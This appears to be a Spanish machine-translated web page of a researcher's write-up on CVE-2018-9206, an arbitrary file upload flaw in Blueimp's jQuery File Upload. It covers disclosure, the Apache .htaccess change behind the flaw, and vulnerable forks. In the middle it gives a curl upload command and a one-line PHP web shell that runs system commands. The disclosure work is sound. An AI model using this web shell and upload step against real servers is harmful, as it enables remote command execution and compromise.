<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>♓️ 🤸🏿 🧜🏾 La seguridad te deja ⬅️ 🙍🏻 😀</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Asistí a una reunión del Grupo de Trabajo de Mensajería, Malware y Anti-Abuso Móvil (m3aawg.org) en Brooklyn, Nueva York. Esperaba un mejor clima para...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>La seguridad te deja</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/427171/"><p>  Asistí a una reunión del Grupo de Trabajo de Mensajería, Malware y Anti-Abuso Móvil (m3aawg.org) en Brooklyn, Nueva York.  Esperaba un mejor clima para pasear por la ciudad, disfrutar de la conferencia y una amplia selección de comida en la zona.  Estaba tan seguro de la claridad del cielo que ni siquiera me llevé nada de la lluvia.  Y llovió toda la semana.  Esto me obligó a quedarme en mi habitación de hotel con WiFi gratis y mi computadora portátil de trabajo.  Decidí pasar este tiempo investigando Node.js y sus paquetes relacionados disponibles en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://www.npmjs.com</a> . </p><br><p>  Hay miles de paquetes de usuarios disponibles para descargar e instalar en su proyecto.  Busqué en NPM nombres de paquetes populares como archivo, copia de seguridad, descarga o carga.  La última búsqueda me mostró un proyecto llamado <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">carga de archivos jQuery</a> desde Blueimp.  Su descripción parecía lo suficientemente interesante como para descargarla y explorarla. </p><a name="habracut"></a><br><blockquote>  Widget de carga de archivos para jQuery, con soporte para selección de archivos múltiples, arrastrar y soltar, indicador de progreso, validación y vista previa de imágenes, audio y video.  Admite solicitudes entre dominios, un mecanismo parcial y renovable para descargar archivos con el cambio de tamaño de las imágenes en el lado del cliente.  Funciona en cualquier plataforma de servidor (PHP, Python, Ruby on Rails, Java, Node.js, Go, etc.), que admite la carga de archivos estándar a través de un formulario HTML. </blockquote><p>  Comencé a mirar el código fuente del paquete y me concentré en un par de archivos PHP en el directorio server / php.  Los archivos se llamaron upload.php y UploadHandler.php.  upload.php llamado UploadHandler.php, donde se encontraba el código de carga del archivo principal.  También noté que los archivos se cargaron en el directorio files / en la raíz del servidor web.  Escribí un comando simple con curl y un script PHP primitivo que me confirmó que puedo cargar el archivo en el servidor y luego usarlo para ejecutar los comandos en el servidor. </p><br><pre><code class="bash hljs">$ curl -F <span class="hljs-string"><span class="hljs-string">"files=@shell.php"</span></span> http://example.com/jQuery-File-Upload-9.22.0/server/php/index.php</code> </pre> <br><p>  Donde el archivo shell.php contiene: </p><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $cmd=$_GET[<span class="hljs-string"><span class="hljs-string">'cmd'</span></span>]; system($cmd);<span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br><p>  Al abrir una página en el navegador con el parámetro cmd = id del servidor de prueba, se devolvió el id del usuario desde el que se inició el proceso del servidor.  Asumí que esta vulnerabilidad no pasó desapercibida y una búsqueda rápida en Google me confirmó que otros proyectos que usaban este código o sus derivados resultaron ser vulnerables.  También hubo varios videos que muestran cómo atacar paquetes de software similares. </p><br><p>  Notifiqué al autor de jQuery File Upload y comencé a documentar lo que encontré para asignar un número CVE.  Pronto al día siguiente, un autor algo avergonzado me respondió, pidiendo más información, ya que no podía reproducir la vulnerabilidad en su entorno de prueba. </p><br><p>  Después de comparar nuestras configuraciones de prueba por correo electrónico, descubrimos que los desarrolladores de Apache habían desactivado la compatibilidad con archivos .htaccess desde la versión 2.3.9.  Resulta que esto se hizo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=https://">para mejorar el rendimiento</a> , por lo que el servidor no tiene que verificar este archivo cada vez que accede al directorio correspondiente.  Además, este cambio también se realizó para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=https://">evitar que los usuarios anulen las configuraciones de seguridad</a> que se configuraron en el servidor. </p><br><p>  Por lo tanto, Apache tenía buenas intenciones al deshabilitar .htaccess, pero sus cambios también pusieron en peligro a algunos desarrolladores y sus proyectos, en particular si contaban con la configuración de seguridad realizada en .htaccess. </p><br><p>  En el caso de esta biblioteca, para manejar adecuadamente esta situación y corregir la vulnerabilidad de carga de archivos CVE-2018-9206, el desarrollador <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">cambió el código para</a> que solo permitiera descargar archivos de imagen. </p><br><h3 id="eta-problema-bolshe-chem-odnogo-proekta">  Este problema es más de un proyecto. </h3><br><p>  También vale la pena señalar aquí que debido a los cambios en Apache, algunos de los 7,800 proyectos restantes pueden ser vulnerables a problemas de carga de archivos. </p><br><p><img src="https://habrastorage.org/webt/-g/ki/4d/-gki4dbjtpslaemnlr0axoqhc48.png"></p><br><p>  La mayoría de estos tenedores todavía tienen la vulnerabilidad original en su código.  En algunos casos, la vulnerabilidad permanece incluso después de que el desarrollador editó el código original de Blueimp para incrustarlo en su proyecto, de modo que los proyectos aún son vulnerables a mi ejemplo de ataque con ligeras variaciones. </p><br><p>  Esto significa que si alguno de estos proyectos se utiliza en producción, está expuesto a la vulnerabilidad de descargar un archivo con su posterior ejecución.  Abre oportunidades para robar datos de la aplicación, inyecta malware, desfigura y otras oportunidades para dañar. </p><br><p>  Desafortunadamente, no hay forma de determinar exactamente cuántos proyectos bifurcados de la carga original de archivos jQuery todavía se admiten activamente y aplicar los cambios realizados en el proyecto principal.  Tampoco es posible determinar exactamente dónde se utilizan los proyectos bifurcados en la producción, si corresponde.  Además, las versiones anteriores del proyecto también eran vulnerables a problemas con la descarga de archivos, hasta 2010. </p><br><h3 id="zaklyuchenie">  Conclusión </h3><br><p>  Internet se basa en muchos mecanismos de seguridad para mantener nuestros sistemas, datos y transacciones seguros y protegidos.  Si uno de estos mecanismos desaparece repentinamente, puede comprometer la seguridad de los usuarios y desarrolladores que confían en él. </p><br><p>  Es una buena idea que los desarrolladores observen los cambios en los sistemas y bibliotecas en los que basan su proyecto.  En este artículo, el mecanismo de seguridad que eliminó Apache no solo afectó la carga del archivo Jquery de Blueimp, sino también todas sus bifurcaciones y ramas.  La vulnerabilidad afectó a muchos proyectos que dependen de ella, desde aplicaciones web independientes hasta complementos para WordPress y otros CMS. </p><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Informe de error original</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Grabar CVE-2018-9206</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Artículo de ZDNet</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es427171/">https://habr.com/ru/post/es427171/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es427155/index.html">Southampton Filter Bus - El primer paso para ciudades más limpias</a></li>
<li><a href="../es427159/index.html">Recopilamos registros del cortafuegos Mikrotik en una base de datos</a></li>
<li><a href="../es427163/index.html">El nuevo material ayudará a que las plantas de energía solar térmica sean más eficientes</a></li>
<li><a href="../es427165/index.html">Cómo desarrollar pruebas de integración para Atlassian Jira Server (jira-func-test-plugin)</a></li>
<li><a href="../es427169/index.html">Tesla silenciosamente eliminó la opción de piloto automático completo</a></li>
<li><a href="../es427173/index.html">¿La telefonía es más barata que gratuita?</a></li>
<li><a href="../es427175/index.html">Sol O qué pasa si eres una planta en tu alma</a></li>
<li><a href="../es427177/index.html">Los narcisos autoabsorbidos son inferiores en productividad a los humildes líderes.</a></li>
<li><a href="../es427179/index.html">Palm renacida de las cenizas con un nuevo gadget</a></li>
<li><a href="../es427181/index.html">Cómo abordar el desarrollo de pila completa hoy si dormiste diez años</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>